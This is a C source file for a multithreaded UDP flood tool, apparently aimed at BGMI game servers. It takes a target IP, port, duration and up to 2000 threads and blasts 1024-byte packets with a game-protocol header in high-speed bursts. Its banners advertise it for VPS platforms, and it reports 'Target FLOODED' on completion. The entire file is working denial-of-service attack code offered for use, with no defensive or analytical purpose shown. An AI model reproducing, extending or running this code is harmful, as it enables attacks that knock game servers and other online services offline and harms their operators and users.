#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <sys/socket.h>
#include <netdb.h>
#include <fcntl.h>

// ============================================
// MAXIMUM POWER CONFIGURATION
// ============================================
#define PACKET_SIZE 1024
#define BURST_SIZE 100
#define PAYLOAD_COUNT 50
#define MAX_THREADS 2000
#define DEFAULT_THREADS 500

volatile int stop_attack = 0;

void handle_signal(int sig) {
    stop_attack = 1;
    printf("\n[!] Attack stopped by user\n");
}

void banner() {
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║              PRIME ONYX - FULL POWER UDP FLOOD                   ║\n");
    printf("║                    BGMI EDITION - MAX POWER                      ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║              Works on ALL VPS Platforms                          ║\n");
    printf("║         Cloudways | DigitalOcean | AWS | Railway                ║\n");
    printf("╚══════════════════════════════════════════════════════════════════╝\n");
}

void usage() {
    banner();
    printf("\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║ Usage: ./bgmi <IP> <PORT> <TIME> <THREADS>                        ║\n");
    printf("║ Example: ./bgmi 1.1.1.1 80 300 500                               ║\n");
    printf("║                                                                    ║\n");
    printf("║ Max Time: 300 seconds (5 minutes)                                 ║\n");
    printf("║ Max Threads: 2000                                                 ║\n");
    printf("║ Packet Size: 1024 bytes                                           ║\n");
    printf("╚══════════════════════════════════════════════════════════════════╝\n\n");
    exit(1);
}

typedef struct {
    char ip[16];
    int port;
    int duration;
    int thread_id;
    unsigned long long packets;
    unsigned long long bytes;
} attack_data;

// BGMI 4.3 Style Payloads
unsigned char payloads[PAYLOAD_COUNT][PACKET_SIZE];

void init_payloads() {
    srand(time(NULL));
    for (int i = 0; i < PAYLOAD_COUNT; i++) {
        for (int j = 0; j < PACKET_SIZE; j++) {
            payloads[i][j] = rand() % 256;
        }
        // BGMI magic header
        payloads[i][0] = 0x16;
        payloads[i][1] = 0x9e;
        payloads[i][2] = 0x56;
        payloads[i][3] = 0xc2;
        
        // Add variation patterns
        if (i % 5 == 0) {
            payloads[i][10] = 0xff;
            payloads[i][20] = 0xaa;
        } else if (i % 5 == 1) {
            payloads[i][15] = 0x55;
            payloads[i][25] = 0xcc;
        } else if (i % 5 == 2) {
            payloads[i][30] = 0x33;
            payloads[i][40] = 0x66;
        }
    }
}

void* udp_flood(void* arg) {
    attack_data* data = (attack_data*)arg;
    int sock;
    struct sockaddr_in target;
    char packet[PACKET_SIZE];
    time_t end_time;
    int idx = 0;
    int b, i;
    
    // Create socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        return NULL;
    }
    
    // Maximum socket optimization
    int val = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val));
    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &val, sizeof(val));
    
    // Large buffer for high throughput
    int buffer_size = 8 * 1024 * 1024; // 8MB
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &buffer_size, sizeof(buffer_size));
    
    // Non-blocking for speed
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(data->port);
    
    // Resolve IP (works with domain names)
    struct hostent *he = gethostbyname(data->ip);
    if (he != NULL) {
        memcpy(&target.sin_addr, he->h_addr_list[0], he->h_length);
    } else {
        target.sin_addr.s_addr = inet_addr(data->ip);
    }
    
    end_time = time(NULL) + data->duration;
    data->packets = 0;
    data->bytes = 0;
    
    // Create base packet
    for (i = 0; i < PACKET_SIZE; i++) {
        packet[i] = rand() % 256;
    }
    packet[0] = 0x16;
    packet[1] = 0x9e;
    packet[2] = 0x56;
    packet[3] = 0xc2;
    
    // High-speed attack loop
    while (time(NULL) < end_time && !stop_attack) {
        // Burst send for maximum throughput
        for (b = 0; b < BURST_SIZE && !stop_attack; b++) {
            for (i = 0; i < PAYLOAD_COUNT; i++) {
                // Use different payloads for better effect
                memcpy(packet, payloads[idx % PAYLOAD_COUNT], 64);
                
                if (sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr*)&target, sizeof(target)) > 0) {
                    data->packets++;
                    data->bytes += PACKET_SIZE;
                }
                idx++;
            }
        }
        
        // Small yield to prevent CPU lock
        if (data->packets % 100000 == 0) {
            usleep(1);
        }
    }
    
    close(sock);
    return NULL;
}

int main(int argc, char* argv[]) {
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
    
    if (argc != 5) {
        usage();
    }
    
    char* ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    
    // Validation
    if (port < 1 || port > 65535) {
        printf("❌ Invalid port! Use 1-65535\n");
        return 1;
    }
    
    if (duration < 1 || duration > 300) {
        printf("❌ Invalid duration! Use 1-300 seconds\n");
        return 1;
    }
    
    if (threads < 1 || threads > MAX_THREADS) {
        printf("❌ Invalid threads! Use 1-%d\n", MAX_THREADS);
        return 1;
    }
    
    banner();
    
    printf("\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║                    ATTACK CONFIGURATION                           ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║ Target      : %s:%d\n", ip, port);
    printf("║ Duration    : %d seconds (%d minutes)\n", duration, duration/60);
    printf("║ Threads     : %d\n", threads);
    printf("║ Packet Size : %d bytes\n", PACKET_SIZE);
    printf("║ Payloads    : %d unique patterns\n", PAYLOAD_COUNT);
    printf("║ Burst Mode  : %d packets/cycle\n", BURST_SIZE);
    printf("╚══════════════════════════════════════════════════════════════════╝\n\n");
    
    printf("🔥 Starting FULL POWER attack on %s:%d...\n", ip, port);
    printf("⚡ Launching %d threads...\n\n", threads);
    
    // Initialize payloads
    init_payloads();
    
    pthread_t tids[threads];
    attack_data data[threads];
    
    for (int i = 0; i < threads; i++) {
        strcpy(data[i].ip, ip);
        data[i].port = port;
        data[i].duration = duration;
        data[i].thread_id = i + 1;
        data[i].packets = 0;
        data[i].bytes = 0;
        
        if (pthread_create(&tids[i], NULL, udp_flood, &data[i]) != 0) {
            printf("❌ Thread %d creation failed\n", i+1);
        }
    }
    
    printf("✅ All %d threads launched successfully!\n", threads);
    printf("⏳ Attack running for %d seconds... (Press Ctrl+C to stop)\n\n", duration);
    
    // Progress monitoring
    int last_percent = 0;
    for (int elapsed = 30; elapsed <= duration && !stop_attack; elapsed += 30) {
        sleep(30);
        if (!stop_attack) {
            int remaining = duration - elapsed;
            int percent = (elapsed * 100) / duration;
            if (percent != last_percent) {
                last_percent = percent;
                printf("⏳ [%d%%] %d/%d sec | %d min %d sec remaining\n", 
                       percent, elapsed, duration, remaining/60, remaining%60);
            }
        }
    }
    
    // Wait for threads to complete
    printf("\n⏳ Waiting for threads to finish...\n");
    for (int i = 0; i < threads; i++) {
        pthread_join(tids[i], NULL);
    }
    
    // Calculate statistics
    unsigned long long total_packets = 0;
    unsigned long long total_bytes = 0;
    for (int i = 0; i < threads; i++) {
        total_packets += data[i].packets;
        total_bytes += data[i].bytes;
    }
    
    double mb_sent = (double)total_bytes / (1024 * 1024);
    double avg_pps = (double)total_packets / duration;
    double mbps = (mb_sent * 8) / duration;
    
    printf("\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║                    ATTACK COMPLETED!                              ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║ Total Packets : %llu\n", total_packets);
    printf("║ Total Data    : %.2f MB\n", mb_sent);
    printf("║ Average Speed : %.0f packets/sec\n", avg_pps);
    printf("║ Bandwidth     : %.2f Mbps\n", mbps);
    printf("║ Status        : ✅ Target FLOODED\n");
    printf("╚══════════════════════════════════════════════════════════════════╝\n");
    
    return 0;
}